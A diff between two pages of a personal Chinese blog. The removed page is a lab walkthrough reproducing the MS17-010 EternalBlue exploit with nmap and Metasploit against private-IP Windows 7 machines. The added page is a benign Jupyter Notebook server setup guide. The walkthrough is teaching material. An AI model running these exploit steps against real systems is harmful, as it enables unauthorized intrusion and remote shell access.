@@ -16,7 +16,7 @@
   <meta name="description" content="Personal Blog of Zhiyu Zhang">
   <meta name="author" content="Zhiyu Zhang">
   <meta name="keywords" content="Security, Machine Learning, Linux">
-  <title>【渗透】MS17-010漏洞复现 - Zhiyu&#39;s Blog</title>
+  <title>搭建Jupyter-Notebook服务器 - Zhiyu&#39;s Blog</title>
 
   <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
 
@@ -161,8 +161,8 @@
               
   <div class="mt-3 post-meta">
     <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-    <time datetime="2019-11-14 19:46">
-      November 14, 2019 pm
+    <time datetime="2020-06-02 16:39">
+      June 2, 2020 pm
     </time>
   </div>
 
@@ -172,7 +172,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      1.1k words
+      1.2k words
     </span>
   
 
@@ -182,7 +182,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      13
+      16
        minutes
     </span>
   
@@ -222,124 +222,118 @@
             
               <p class="note note-info">
                 
-                  Last updated on：October 12, 2020 pm
+                  Last updated on：January 25, 2021 am
                 
               </p>
             
             <article class="markdown-body">
-              <h2 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1 漏洞原理"></a>1 漏洞原理</h2><h3 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h3><p><strong>EternalBlue(在微软的MS17-010中被修复)是在Windows的SMB服务处理SMB v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。</strong></p>
-<p>从EternalBlue这个Exploit被影子经纪人公布到互联网上后，就成为了“明星”。这个Exploit被多款恶意软件利用。包括肆虐的<strong>WannaCrypt</strong>，无文件的勒索软件<strong>UIWIX</strong>和SMB蠕虫<strong>EternalRocks</strong>。</p>
+              <p>在自己的云服务器上搭建Jupyter-Notebook服务器有以下几个好处：</p>
 <a id="more"></a>
-<h3 id="1-2-漏洞简析"><a href="#1-2-漏洞简析" class="headerlink" title="1.2 漏洞简析"></a>1.2 漏洞简析</h3><p><strong>Eternalblue利用了3个不同的bug</strong></p>
 <ul>
-<li>第一个是内核态函数<strong>srv!SrvOs2FeaListToNt</strong>在处理FEA(File Extended Attributes)转换时，由于错误地使用的<strong>WORD强制类型转换</strong>，导致在大非分页池(内核的数据结构，Large Non-Paged Kernel Pool)的<strong>缓冲区溢出</strong>。</li>
-<li>第二个漏洞可以触发缓冲区溢出，这是由于SMB协议定义的两个子命令SMB_COM_TRANSACTION2和SMB_COM_NT_TRANSACT的差别。如果有太多的数据要包含在一个单独的包中，就需要_SECONDARY命令。TRANSACTION2和NT_TRANSACT的关键区别在于<strong>后者调用的数据包是前者大小的2倍</strong>。如果客户端使用NT_TRANSACT子命令在TRANSACTION2子命令前发送伪造的消息，就会出现验证错误。如果协议发现接收了2个分开的子命令，就会根据最后接收的包的类型来分配类型和大小。因为最后接收的包比较小，所以第一个包会占用比分配空间更多的空间。</li>
-<li>一旦攻击者完成初始的溢出，就可以利用SMB v1中的第3个漏洞来进行Heap Spraying(堆喷射)，导致在给定地址分配一块内存。然后，攻击者就可以写入和执行shellcode来控制系统。</li>
+<li>充分利用云服务器的计算和存储资源</li>
+<li>统一代码环境和数据集（在不同终端机器上构建的环境是可能不一致的）</li>
+<li>能够随时随地访问（只要ECS还没过期&amp;你的机器能上网）</li>
 </ul>
-<h2 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2 漏洞复现"></a>2 漏洞复现</h2><h3 id="2-1-渗透Windows7-32-bit"><a href="#2-1-渗透Windows7-32-bit" class="headerlink" title="2.1 渗透Windows7 32-bit"></a>2.1 渗透Windows7 32-bit</h3><h4 id="2-1-1-实验环境"><a href="#2-1-1-实验环境" class="headerlink" title="2.1.1 实验环境"></a>2.1.1 实验环境</h4><p><strong>实验平台：</strong></p>
+<h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1 环境搭建"></a>1 环境搭建</h2><h3 id="1-1-安装Python"><a href="#1-1-安装Python" class="headerlink" title="1.1 安装Python"></a>1.1 安装Python</h3><p>虽然阿里云的Ubuntu 18.04 云服务器是自带python2.7和python3.6的，但我还是选择<strong>安装miniconda3<a href="https://docs.conda.io/en/latest/miniconda.html" target="_blank" rel="noopener">(官网)</a></strong>，理由如下：</p>
 <ul>
-<li>带有MS17-010漏洞的Windows 7 pro x86， 内部版本7601<ul>
-<li><strong>IP：192.168.188.136</strong></li>
+<li>anaconda便于管理<strong>多版本且隔离</strong>的python环境（除此以外virtualenv和pyvenv也可，但管理方式不如conda）</li>
+<li>miniconda比anaconda<strong>轻量</strong>，它仅包含<strong>conda和python</strong>和少量依赖包与软件包</li>
 </ul>
-</li>
-<li>Kali Linux，用于渗透<ul>
-<li><strong>IP：192.168.188.135</strong></li>
-</ul>
-</li>
-</ul>
-<p><strong>实验配置：</strong></p>
-<p>kali没有32位机器的渗透模块，我们需要做以下配置</p>
-<ul>
-<li><strong>安装wine 32</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># root 权限</span>
-dpkg --add-architecture i386
-apt-get update
-apt-get install wine32</code></pre></div>
-<ul>
-<li><strong>拉取EternalBlue_Doublepulsar攻击模块</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
+<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 从官方站点下载速度较慢，可从国内镜像站下载miniconda3-py38 64-bit</span>
+wget -c https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/Miniconda3-py38_4.9.2-Linux-x86_64.sh
 
-<span class="hljs-comment"># 将模块拷贝到msf的相应目录</span>
-<span class="hljs-built_in">cd</span> Eternalblue-Doublepulsar-metasploit
-cp -r deps/ eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</code></pre></div>
-<ul>
-<li><strong>运行postgresql</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash">service postgresql start</code></pre></div>
-<h4 id="2-1-2-信息搜集"><a href="#2-1-2-信息搜集" class="headerlink" title="2.1.2 信息搜集"></a>2.1.2 信息搜集</h4><ul>
-<li><strong>nmap扫描</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># root 权限</span>
-namp -sS -sV -Pn 192.168.188.136</code></pre></div>
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191107174140.png" srcset="/img/loading.gif" alt></p>
-<p>发现该win7开放了445端口，可进一步采用msfconsole进行扫描分析</p>
-<ul>
-<li><strong>查看并使用辅助扫描模块测试目标是否可攻击</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 运行msfconsole工具</span>
-msfconsole
+<span class="hljs-comment"># 添加当前用户可执行权限</span>
+chmod u+x ./Miniconda3-py38_4.9.2-Linux-x86_64.sh
 
-<span class="hljs-comment"># 搜索ms17-010相关模块，并采用辅助模块进行测试</span>
-search ms17-010
+<span class="hljs-comment"># 执行安装脚本，依照提示完成安装</span>
+./Miniconda3-py38_4.9.2-Linux-x86_64.sh
 
-<span class="hljs-comment"># 发现有一个ms17_010的扫描检测模块可用, use</span>
-use auxiliary/scanner/smb/smb_ms17_010</code></pre></div>
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109164105.png" srcset="/img/loading.gif" alt></p>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 设置RHOSTS项为192.168.188.136</span>
-<span class="hljs-built_in">set</span> RHOSTS 192.168.188.136
+<span class="hljs-comment"># 添加环境变量(非zsh用户)，若你正在使用zsh请将/etc/profile替换为~/.zshrc</span>
+sudo <span class="hljs-built_in">echo</span> <span class="hljs-string">"export PATH=<span class="hljs-variable">$PATH</span>:/home/<span class="hljs-variable">$USER</span>/miniconda3/bin"</span> &gt;&gt; /etc/profile &amp; <span class="hljs-built_in">source</span> /etc/profile</code></pre></div>
+<p>完成miniconda3的安装之后，需要使用<code>update-alternatives</code>配置<strong>多版本Python</strong>的优先级，将conda的python3.8设为默认python：</p>
+<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 查看是否已经建立了python的alternative管理，若无则创建</span>
+sudo update-alternatives --config python
 
-<span class="hljs-comment"># 运行该ms17_010检测模块</span>
-run</code></pre></div>
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109164829.png" srcset="/img/loading.gif" alt></p>
-<p><strong>发现确实目标机器存在MS17-010，并提示可用之前git clone的DoublePulsar模块进行侵入</strong></p>
-<h4 id="2-1-3-开始渗透"><a href="#2-1-3-开始渗透" class="headerlink" title="2.1.3 开始渗透"></a>2.1.3 开始渗透</h4><ul>
-<li><strong>尝试攻击</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 使用doublepulsar攻击模块</span>
-use exploit/windows/smb/eternalblue_doublepulsar
+<span class="hljs-comment"># 依次创建自带python2，python3以及miniconda3的python3的alternatives管理，最后的数字为优先级，越大越高</span>
+sudo update-alternatives --install /usr/bin/python python /usr/bin/python2.7 1
+sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.6 2
+sudo update-alternatives --install /usr/bin/python python /home/<span class="hljs-variable">$USER</span>/miniconda3/bin/python3 3</code></pre></div>
+<h3 id="1-2-安装Jupyter"><a href="#1-2-安装Jupyter" class="headerlink" title="1.2 安装Jupyter"></a>1.2 安装Jupyter</h3><p>在命令行中输入<code>python -V</code>和<code>pip -V</code> 确认能够看到正在使用miniconda3的python和pip</p>
+<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># pip换国内源以提速，在~/.pip/pip.conf中添加以下内容，文件不存在则创建</span>
+[global]
+index-url = https://pypi.tuna.tsinghua.edu.cn/simple
 
-<span class="hljs-comment"># 设置RHOST项为192.168.188.136</span>
-<span class="hljs-built_in">set</span> RHOST 192.168.188.136
+<span class="hljs-comment"># 安装jupyter</span>
+pip install jupyter</code></pre></div>
+<h2 id="2-配置Jupyter-Notebook"><a href="#2-配置Jupyter-Notebook" class="headerlink" title="2 配置Jupyter-Notebook"></a>2 配置Jupyter-Notebook</h2><h3 id="2-1-配置登陆密码"><a href="#2-1-配置登陆密码" class="headerlink" title="2.1 配置登陆密码"></a>2.1 配置登陆密码</h3><p>为了保障远程访问云服务器Jupyter服务的安全性，我们需要为notebook设定密码。（该密码会在登陆Jupyter服务时要求用户输入，若与服务器上存储的hash值匹配则放行）</p>
+<p>以下是借助<code>IPython.lib</code>中的<code>passwd</code>函数来生成密码的sha1 code：</p>
+<div class="hljs"><pre><code class="hljs ipython">Python <span class="hljs-number">3.8</span><span class="hljs-number">.5</span> (default, Sep  <span class="hljs-number">4</span> <span class="hljs-number">2020</span>, <span class="hljs-number">07</span>:<span class="hljs-number">30</span>:<span class="hljs-number">14</span>)
+[GCC <span class="hljs-number">7.3</span><span class="hljs-number">.0</span>] :: Anaconda, Inc. on linux
+Type <span class="hljs-string">"help"</span>, <span class="hljs-string">"copyright"</span>, <span class="hljs-string">"credits"</span> <span class="hljs-keyword">or</span> <span class="hljs-string">"license"</span> <span class="hljs-keyword">for</span> more information.
+<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> IPython.lib <span class="hljs-keyword">import</span> passwd
+<span class="hljs-meta">&gt;&gt;&gt; </span>passwd()
+Enter password:
+Verify password:
+<span class="hljs-string">'sha1:..............YOUR-HASH-CODE....................'</span>
+&gt;&gt;&gt;</code></pre></div>
+<h3 id="2-2-生成配置文件"><a href="#2-2-生成配置文件" class="headerlink" title="2.2 生成配置文件"></a>2.2 生成配置文件</h3><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 生成 /home/$USER/.jupyter/jupyter_notebook_config.py 配置文件</span>
+jupyter notebook --generate-config</code></pre></div>
+<p>由于该配置文档的所有内容均默认注释，因此可以把我们自己的配置集中追加到文尾：</p>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#--------------------------------------------------------------------------</span>
+<span class="hljs-comment"># User configuration</span>
+<span class="hljs-comment">#--------------------------------------------------------------------------</span>
+c.NotebookApp.ip = <span class="hljs-string">'*'</span>                               <span class="hljs-comment"># notebook监听的IP</span>
+c.NotebookApp.port = <span class="hljs-number">8888</span>  							 <span class="hljs-comment"># notebook监听的端口</span>
+c.NotebookApp.notebook_dir = <span class="hljs-string">'/path/to/project-dirs'</span> <span class="hljs-comment"># notebook的工作目录</span>
+c.NotebookApp.open_browser = <span class="hljs-literal">False</span>                   <span class="hljs-comment"># 运行notebook服务时不打开浏览器</span>
+c.NotebookApp.password = <span class="hljs-string">u'sha1:c63cf.....45b09bed'</span>  <span class="hljs-comment"># 密码的hash 值</span></code></pre></div>
+<p><strong>注意</strong>：notebook_dir即为notebook的/，因此为了保证安全性，请将notebook的工作目录设为非重要目录，如你可以创建一个<code>~/jupyter-projects</code></p>
+<p>完成配置之后可以启动notebook并访问啦：</p>
+<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 使用jupyter-notebook也是一样的</span>
+jupyter notebook
 
-<span class="hljs-comment"># 查看攻击模块的配置，请特别注意DOUBLEPULSARPATH是否与你git clone下载的路径一致</span>
-show options</code></pre></div>
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109170635.png" srcset="/img/loading.gif" alt></p>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 运行攻击模块</span>
-run</code></pre></div>
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109171143.png" srcset="/img/loading.gif" alt></p>
-<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 渗透并没有成功，修改PROCESSINJECT项为explorer.exe (修改为lsass.exe也可以)</span>
-<span class="hljs-built_in">set</span> PROCESSINJECT explorer.exe
+<span class="hljs-comment"># 或者更优雅一点</span>
+nohup jupyter notebook &gt;&gt; ~/.notebook.log 2&gt;&amp;1 &amp;</code></pre></div>
+<p><strong>注意</strong>：要记得在云服务器控制台的安全组中配置规则放行notebook监听的<code>8888</code>端口哦</p>
+<h3 id="2-3-撰写systemd服务脚本"><a href="#2-3-撰写systemd服务脚本" class="headerlink" title="2.3 撰写systemd服务脚本"></a>2.3 撰写systemd服务脚本</h3><p>将以下内容写入<code>/usr/lib/systemd/system/notebook.service</code>，若目录不存在则手动创建</p>
+<div class="hljs"><pre><code class="hljs shell">[Unit]
+Description=My notebook service
+After=network.target
 
-<span class="hljs-comment"># 再次exploit，成功</span>
-run</code></pre></div>
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191109171502.png" srcset="/img/loading.gif" alt></p>
-<p><strong>meterpreter</strong>是一个为攻击者提供交互性shell以便于在目标机器上执行代码的命令行工具。渗透成功的后续攻击可以参考阅读<a href="https://qgrain.github.io/2019/11/14/渗透-通过meterpreter进行提权/">【渗透】meterpreter提权</a></p>
-<h3 id="2-2-渗透Windows7-64-bit"><a href="#2-2-渗透Windows7-64-bit" class="headerlink" title="2.2 渗透Windows7 64-bit"></a>2.2 渗透Windows7 64-bit</h3><p>相比于渗透Windows7 32-bit，渗透64位机器要简单得多，因为64位机器的渗透是msf内建支持的。</p>
-<p><strong><em>前几个步骤基本和渗透32位机器一致</em></strong></p>
-<h4 id="2-2-1-信息搜集"><a href="#2-2-1-信息搜集" class="headerlink" title="2.2.1 信息搜集"></a>2.2.1 信息搜集</h4><ul>
-<li><strong>nmap扫描主机信息</strong></li>
-<li><strong>msfconsole采用scanner模块扫描检测ms17-010漏洞</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_ms17_010
-<span class="hljs-built_in">set</span> RHOSTS 192.168.188.138 <span class="hljs-comment"># Windows 7 x64</span>
-show options
-run</code></pre></div>
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191114113425.png" srcset="/img/loading.gif" alt></p>
-<h4 id="2-2-2开始渗透"><a href="#2-2-2开始渗透" class="headerlink" title="2.2.2开始渗透"></a>2.2.2开始渗透</h4><ul>
-<li><strong>方法一：采用msf自带的eternalblue攻击模块</strong></li>
-</ul>
-<div class="hljs"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue
-<span class="hljs-built_in">set</span> RHOST 192.168.188 138 <span class="hljs-comment"># Windows 7 x64</span>
-show options
-run</code></pre></div>
-<p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191114114152.png" srcset="/img/loading.gif" alt></p>
-<p>成功拿到目标机器的Shell</p>
-<ul>
-<li><strong>方法二：采用github开源攻击模块DoublePulsar</strong></li>
-</ul>
-<p>步骤和攻击32位机器一致，但是需要配置<a href>wine64和wine32共存</a></p>
+[Service]
+<span class="hljs-meta">#</span><span class="bash">Type=simple  <span class="hljs-comment"># default simple</span></span>
+User=qgrain
+Group=qgrain
+ExecStart=/home/qgrain/miniconda3/bin/jupyter-notebook
+Restart=on-failure
+RestartSec=10s
+
+[Install]
+WantedBy=multi-user.target</code></pre></div>
+<p>然后配置<code>notebook.service</code>自启动</p>
+<div class="hljs"><pre><code class="hljs bash">sudo systemctl <span class="hljs-built_in">enable</span> notebook
+sudo systemctl [start|stop|restart|status] notebook</code></pre></div>
+<h2 id="3-主题美化⭐"><a href="#3-主题美化⭐" class="headerlink" title="3 主题美化⭐"></a>3 主题美化⭐</h2><h3 id="3-1-安装jupyter-themes"><a href="#3-1-安装jupyter-themes" class="headerlink" title="3.1 安装jupyter-themes"></a>3.1 安装jupyter-themes</h3><p>参考<a href="https://github.com/dunovank/jupyter-themes" target="_blank" rel="noopener">Git开源项目：jupyter-themes</a></p>
+<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 安装jupyter-themes</span>
+pip install jupyter-themes
+
+<span class="hljs-comment"># 更新jupyter-themes至latest</span>
+pip install --update jupyter-themes</code></pre></div>
+<h3 id="3-2-配置主题"><a href="#3-2-配置主题" class="headerlink" title="3.2 配置主题"></a>3.2 配置主题</h3><p><code>jupyter-themes</code>有以下几条关键命令，具体Usage请见其git仓库的README：</p>
+<div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># 查看所有主题</span>
+jt -l
+
+<span class="hljs-comment"># 将主题配置为monokai</span>
+jt -t monokai
+
+<span class="hljs-comment"># 我的配置命令如下，这样的notebook界面极其舒适ヾ(≧▽≦ )o</span>
+jt -t monokai -f roboto -fs 12 -nfs 14 -tfs 13 -ofs 11 -dfs 10 -cellw 66% -T -N -kl</code></pre></div>
+<p>其中参数含义依次为设置主题为<code>monokai</code>，设置代码字体为<code>roboto</code>，设置代码字号为<code>12</code>，设置notebook字号为<code>14</code>，设置文本/Markdown字号为<code>13</code>，设置输出字号为<code>11</code>，设置Pandas Dataframe字号为<code>10</code>，设置cell宽度为屏幕的<code>66%</code>，设置<code>Toolbar可见</code>，设置<code>Name&amp;Logo可见</code>以及设置<code>Kernel Logo可见</code></p>
+<p>具体界面效果如下（当然，passwd我为了测试，输入的是123）：</p>
+<p><img src="https://gitee.com/QGrain/picgo-bed/raw/master/img/20210125012950.png" srcset="/img/loading.gif"></p>
+<h2 id="4-参考"><a href="#4-参考" class="headerlink" title="4 参考"></a>4 参考</h2><p><a href="https://bitmingw.com/2017/07/09/run-jupyter-notebook-server/" target="_blank" rel="noopener">[1] Ming’s Blog | 搭建 ipython/jupyter notebook 服务器</a></p>
+<p><a href="https://qgrain.github.io/2020/05/12/%E7%BC%96%E5%86%99systemd%E6%9C%8D%E5%8A%A1%E8%84%9A%E6%9C%AC/">[2] Zhiyu’s Blog | 编写systemd服务脚本 </a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/46242116" target="_blank" rel="noopener">[3] 知乎 |【内容引起舒适】让你的Jupyter Notebook不再辣眼睛</a></p>
 
             </article>
             <hr>
@@ -350,9 +344,9 @@ run</code></pre></div>
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/Bug/">Bug</a>
+                      <a class="hover-with-bg" href="/tags/Selfhosted/">Selfhosted</a>
                     
-                      <a class="hover-with-bg" href="/tags/Penetration/">Penetration</a>
+                      <a class="hover-with-bg" href="/tags/Server/">Server</a>
                     
                   </div>
                 
@@ -365,9 +359,9 @@ run</code></pre></div>
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/2019/11/14/渗透-meterpreter命令详解/">
+                      <a href="/2020/07/15/Fluid主题样式备忘录/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">【渗透】meterpreter命令详解</span>
+                        <span class="hidden-mobile">Fluid主题样式备忘录</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -375,8 +369,8 @@ run</code></pre></div>
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2019/10/22/Iptables-1/">
-                        <span class="hidden-mobile">Iptables(1)</span>
+                      <a href="/2020/05/12/编写systemd服务脚本/">
+                        <span class="hidden-mobile">编写systemd服务脚本</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -630,7 +624,7 @@ run</code></pre></div>
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "【渗透】MS17-010漏洞复现&nbsp;",
+        "搭建Jupyter-Notebook服务器&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 80,
